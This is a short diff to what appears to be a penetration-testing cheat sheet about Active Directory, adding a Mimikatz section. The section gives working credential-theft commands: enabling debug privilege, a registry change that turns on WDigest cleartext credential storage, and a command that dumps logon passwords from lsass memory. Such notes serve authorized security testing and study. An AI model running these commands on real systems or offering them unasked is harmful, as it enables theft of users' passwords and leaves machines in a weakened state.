@@ -907,6 +907,21 @@ Usuarios del AD (ADWS)
 ```
 Get-ADUser -Filter * | select name
 ```
+## Mimikatz
+
+Check privileges
+```
+privilege::debug
+```
+Enable wdigest
+```
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+```
+Read lsass.exe
+```
+sekurlsa::logonpasswords
+```
+
 
 ## Privilege Escalation
 
